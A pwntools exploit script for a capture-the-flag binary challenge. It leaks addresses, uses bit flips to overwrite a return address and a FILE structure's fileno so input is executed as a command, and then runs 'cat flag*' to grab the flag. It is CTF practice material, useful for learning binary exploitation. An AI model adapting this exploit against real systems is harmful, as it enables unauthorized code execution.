#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.cmd+1; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()

def parser():
    line = io.recvline().decode().strip()
    line = line.split(' = ')
    return line[-1]

def flip_at(address, posix):
    io.sendlineafter(b'>', hex(address).encode())
    io.sendline(f"{posix}".encode())

io.recvline()
main = int(parser(), 16)
libc_system = int(parser(), 16)
stack_ref = int(parser(), 16)
heap = int(parser(), 16)
return_address = stack_ref + 24
fileptr = heap - 134384
fileno = fileptr + 0x70

success(f"main        @ {hex(main)}")
success(f"libc system @ {hex(libc_system)}")
success(f"stack ref   @ {hex(stack_ref)}")
success(f"heap        @ {hex(heap)}")
success(f"vuln ret    @ {hex(return_address)}")
success(f"file struct @ {hex(fileptr)}")

# On remote, fileno is located at the same address as fileptr
# Locally, you must instead use the fileno address
flip_at(return_address, 3)  # the first bit flip changes vuln's return address to cmd
flip_at(fileptr, 0)         # these bit flips change fileno from 3 (file) to 0 (stdin)
flip_at(fileptr, 1)

# Now fgets will read from the FILE pointer
# but the FILE structure now points to stdin
# effectively allowing execution of arbitrary input

io.sendline(b"cat flag*")

data = io.recvregex(rb'0xfun\{.*\}', capture=True)
flag = data.group(0).decode()

success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
